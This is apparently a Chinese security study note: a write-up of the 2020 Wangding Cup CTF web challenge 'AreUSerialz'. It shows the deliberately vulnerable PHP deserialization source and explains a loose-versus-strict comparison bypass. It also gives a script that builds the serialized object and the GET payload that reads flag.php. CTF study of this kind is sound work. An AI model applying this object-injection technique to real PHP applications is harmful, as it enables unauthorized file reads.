---
title: "网安笔记 - 靶场实例 - 反序列化 - 2020-网鼎杯-青龙组-Web-AreUSerialz"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

```php
<?php  
  
include("flag.php");  
  
highlight_file(__FILE__);  
  
class FileHandler {  
  
    protected $op;  
    protected $filename;  
    protected $content;  
  
    function __construct() {       
     $op = "1";       
      $filename = "/tmp/tmpfile";        
      $content = "Hello World!";        
      $this->process();  
    }  
  
    public function process() {  
        if($this->op == "1") {            
        $this->write();  
        } 
        else if($this->op == "2") {           
         $res = $this->read();            
         $this->output($res);  
        } 
        else {            
        $this->output("Bad Hacker!");  
        }  
    }  
  
    private function write() {  
        if(isset($this->filename) && isset($this->content)) {  
            if(strlen((string)$this->content) > 100) {               
             $this->output("Too long!");  
                die();  
            }           
$res = file_put_contents($this->filename, $this->content);  
            if($res) $this->output("Successful!");  
            else $this->output("Failed!");  
        } else {           
         $this->output("Failed!");  
        }  
    }  
  
    private function read() {       
     $res = "";  
        if(isset($this->filename)) {            
        $res = file_get_contents($this->filename);  
        }  
        return $res;  
    }  
  
    private function output($s) {  
        echo "[Result]: <br>";  
        echo $s;  
    }  
  
    function __destruct() {  
        if($this->op === "2")           
         $this->op = "1";     
         $this->content = "";        
         $this->process();  
    }  
  
}  
  
function is_valid($s) {  
    for($i = 0; $i < strlen($s); $i++)  
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))  
            return false;  
    return true;  
}  
  
if(isset($_GET{'str'})) {   
 $str = (string)$_GET['str'];  
    if(is_valid($str)) {        
    $obj = unserialize($str);  
    }  
  
}
```

### WriteUp

get传参str
`$obj = unserialize($str);`
这句代码能看出大概率考的是反序列化
` function __destruct() {  
        if($this->op === "2")           
         $this->op = "1";     
         $this->content = "";        
         $this->process();  
    }  
   `
   这串代码 只要代码结束就会调用 所以我们可以操控op content process的值
   
   ```php
   <?php
class FileHandler {

    public $op=' 2'; //代码中能读出 op为1时是执行文件 op为2时是读取文件 但是在destruct方法中op强制设为1了 destruct魔术方法中用的是'==='强比较 比较的是值和类型 而process函数用的是'=='弱比较 只比较值不比较类型 这就形成了绕过
    public $filename='flag.php';
    public $content='aaa';
}
$a=new FileHandler;
echo serialize($a);
?>
   ```
   

这串代码运行后输出值为
```txt
O:11:"FileHandler":3:{s:2:"op";s:2:" 2";s:8:"filename";s:8:"flag.php";s:7:"content";s:3:"aaa";}
```
### payload
?str=O:11:"FileHandler":3:{s:2:"op";s:2:" 2";s:8:"filename";s:8:"flag.php";s:7:"content";s:3:"aaa";}